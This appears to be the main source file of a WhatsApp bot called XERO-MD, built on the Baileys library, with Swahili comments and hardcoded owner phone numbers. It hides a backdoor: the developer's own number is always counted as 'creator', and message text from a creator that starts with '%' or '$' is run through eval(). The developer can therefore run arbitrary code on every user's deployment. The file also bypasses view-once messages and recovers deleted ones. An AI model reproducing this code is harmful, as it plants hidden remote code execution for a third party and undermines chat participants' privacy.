
const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason,
jidNormalizedUser,
isJidBroadcast,
getContentType,
proto,
generateWAMessageContent,
generateWAMessage,
AnyMessageContent,
prepareWAMessageMedia,
areJidsSameUser,
downloadContentFromMessage,
MessageRetryMap,
generateForwardMessageContent,
generateWAMessageFromContent,
generateMessageID, makeInMemoryStore,
jidDecode,
fetchLatestBaileysVersion,
Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type');
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['255763111390', '255610209120']

// =========== SETBOT INTEGRATION - PART 1 ===========
let setbotMiddleware = null;
try {
    const setbotModule = require('./plugins/setbot');
    if (setbotModule && setbotModule.middleware) {
        setbotMiddleware = setbotModule.middleware;
        console.log('🔐 Setbot Access Control: ENABLED');
    }
} catch (error) {
    console.log('🔓 Setbot Access Control: DISABLED (Plugin not found)');
}
// ===================================================

// =========== ONGEZA HIZI SETTINGS YA CHATBOT ===========
config.GROUP_CHATBOT = config.GROUP_CHATBOT || false;    
config.PRIVATE_CHATBOT = config.PRIVATE_CHATBOT || false;  
// =====================================================

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
}

setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH FIXED VERSION===================
// Hakikisha folder ya sessions ipo
if (!fs.existsSync(__dirname + '/sessions')) {
    fs.mkdirSync(__dirname + '/sessions');
}

if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if(!config.SESSION_ID || config.SESSION_ID === '') {
        console.log('========================================');
        console.log('⚠️ HAKUNA SESSION_ID ILIYOWEKWA!');
        console.log('⚠️ Bot itasubiri hadi uweke SESSION_ID');
        console.log('⚠️ Weka SESSION_ID kwenye Heroku Config Vars');
        console.log('========================================');
    } else {
        console.log('📥 Inapakua session kutoka MEGA...');
        const sessdata = config.SESSION_ID.replace("jamali~", '').replace("XTREME", '');
        const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
        filer.download((err, data) => {
            if(err) {
                console.log('❌ Session download failed:', err.message);
                console.log('❌ Hakikisha SESSION_ID yako ni sahihi');
            } else {
                fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
                    console.log("✅ Session downloaded successfully");
                });
            }
        });
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

//=============================================

async function connectToWA() {
console.log("Connecting to WhatsApp ⏳️...");
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
var { version } = await fetchLatestBaileysVersion()

const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
        })
    
conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
console.log('🔄 Connection closed, reconnecting...');
connectToWA()
}
} else if (connection === 'open') {
console.log('🧬 Installing Plugins')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('Plugins installed successful ✅')
console.log('XERO-MD CONNECTED SUCCESSFULLY ✅')

let up = `*╭┈───────────────╮*
*│ ◦* *XERO MD ᴄᴏɴᴇᴄᴛᴇᴅ*
*│ ◦* *ᴅᴇᴠ* : *nyoni-xmd*
*│ ◦* *sᴀᴛᴜs* : *ᴏɴʟʏ*
*│ ◦* *ɴᴜᴍʙᴇʀ 1* : +255763111390
*│ ◦* *ɴᴜᴍʙᴇʀ 2* : +255610209120
*│  ◦* *ᴘʀᴇғɪx: ${config.PREFIX}*
*│  ◦* *ᴍᴏᴅᴇ: ${config.MODE}*
*│  ◦* *ᴛʏᴘᴇ : ${config.PREFIX}menu* *╰┈───────────────╯*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ nyoni-xmd*`;
  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/2hasag.jpg` }, caption: up })
}
})
conn.ev.on('creds.update', saveCreds)

conn.ev.on('messages.update', async updates => {
  for (const update of updates) {
    if (update.update.message === null) {
      console.log("Delete Detected:", JSON.stringify(update, null, 2));
      await AntiDelete(conn, updates);
    }
  }
});

conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
	  
conn.ev.on('messages.upsert', async(mek) => {
  mek = mek.messages[0]
  if (!mek.message) return
  mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
  ? mek.message.ephemeralMessage.message 
  : mek.message;

  // === HAPA NDIPO KODI YA MENU LIST RESPONSE INAPOKAA ===
  if (mek.message.listResponseMessage) {
      let selectedRowId = mek.message.listResponseMessage.singleSelectReply.selectedRowId;
      if (selectedRowId) {
          mek.message.conversation = selectedRowId;
      }
  }
  // ===================================================

if (config.READ_MESSAGE === 'true') {
  await conn.readMessages([mek.key]);
}
  if(mek.message.viewOnceMessageV2)
  mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
    await conn.readMessages([mek.key])
  }
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
  const jawadlike = await conn.decodeJid(conn.user.id);
  const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
  await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, jawadlike] });
}                       
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
const user = mek.key.participant
const text = `${config.AUTO_STATUS_MSG}`
await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
          }
          await Promise.all([
            saveMessage(mek),
          ]);
          
  // =========== ONGEZA CHATBOT HANDLER HAPA ===========
  await handleChatbotMessages(conn, mek);
  // =================================================
          
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []

// FIX: Body kusoma pia List Response
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type === 'listResponseMessage') ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : ''

const isCmd = body.startsWith(prefix)
var budy = typeof mek.text == 'string' ? mek.text : false;
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const text = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const isMe = botNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isReact = m.message.reactionMessage ? true : false
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}
const udp = botNumber.split('@')[0];
  const jawad = ('255763111390', '255610209120', '255763111390');
  let isCreator = [udp, jawad, config.DEV]
          .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
          .includes(mek.sender);

  if (setbotMiddleware && isCmd) {
      try {
          const blockCommand = await setbotMiddleware(conn, mek, m, {
              from, quoted, body, isCmd, command, args, q, text, 
              isGroup, sender, senderNumber, botNumber2, botNumber, 
              pushname, isMe, isOwner, isCreator, groupMetadata, 
              groupName, participants, groupAdmins, isBotAdmins, 
              isAdmins, reply, prefix
          });
          if (blockCommand === true) return;
      } catch (error) { console.error('Setbot middleware error:', error); }
  }
  
  if (isCreator && mek.text.startsWith('%')) {
          let code = budy.slice(2);
          if (!code) { reply(`Provide me with a query to run Master!`); return; }
          try {
              let resultTest = eval(code);
              if (typeof resultTest === 'object') reply(util.format(resultTest));
              else reply(util.format(resultTest));
          } catch (err) { reply(util.format(err)); }
          return;
      }
  if (isCreator && mek.text.startsWith('$')) {
          let code = budy.slice(2);
          if (!code) { reply(`Provide me with a query to run Master!`); return; }
          try {
              let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
              let h = util.format(resultTest);
              if (h === undefined) return console.log(h);
              else reply(h);
          } catch (err) { reply(util.format(err)); }
          return;
      }
  
if (senderNumber.includes("255763111390") && !isReact) {
const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
m.react(randomReaction);
}

if (!isReact && config.AUTO_REACT === 'true') {
  const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}
        
if (!isReact && config.CUSTOM_REACT === 'true') {
  const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}
      
if(!isOwner && config.MODE === "private") return
if(!isOwner && isGroup && config.MODE === "inbox") return
if(!isOwner && !isGroup && config.MODE === "groups") return
 
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
try {
cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) { console.error("[PLUGIN ERROR] " + e); }
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (command.on === "sticker" && mek.type === "stickerMessage") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}});

});
  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
    } else return jid;
  };
  conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
    let vtype
    if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
        delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
        delete message.message.viewOnceMessage.message[vtype].viewOnce
        message.message = { ...message.message.viewOnceMessage.message }
    }
    let mtype = Object.keys(message.message)[0]
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]
    let context = {}
    if (mtype != "conversation") context = message.message[mtype].contextInfo
    content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
    const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options, ...(options.contextInfo ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } } : {}) } : {})
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
  }
  conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
    let type = await FileType.fromBuffer(buffer)
    trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
  }
  conn.downloadMediaMessage = async(message) => {
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(message, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
    return buffer
  }
  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                let mime = '';
                let res = await axios.head(url)
                mime = res.headers['content-type']
                if (mime.split("/")[1] === "gif") { return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options }) }
                if (mime === "application/pdf") { return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options }) }
                if (mime.split("/")[0] === "image") { return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options }) }
                if (mime.split("/")[0] === "video") { return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options }) }
                if (mime.split("/")[0] === "audio") { return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options }) }
              }

// =========== ONGEZA HII KUSUBIRI SESSION ===========
let isConnected = false;

// Timeout baada ya sekunde 30 - ikiwa haija connect, subiri tena
setTimeout(() => {
    if (!isConnected) {
        console.log('⚠️ Bot bado haija connect, inasubiri session...');
        console.log('⚠️ Hakikisha SESSION_ID yako ni sahihi');
    }
}, 30000);

// =========== ONGEZA HII KUSIMAMISHA CRASH ===========
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    // Usiue bot, endelea
});

process.on('unhandledRejection', (err) => {
    console.error('❌ Unhandled Rejection:', err);
    // Usiue bot, endelea
});
// =================================================

connectToWA()

app.get("/", (req, res) => {
    res.send("XERO-MD is running!");
});

app.listen(port, () => {
    console.log(`XERO-MD is running on port ${port}`);
});
```
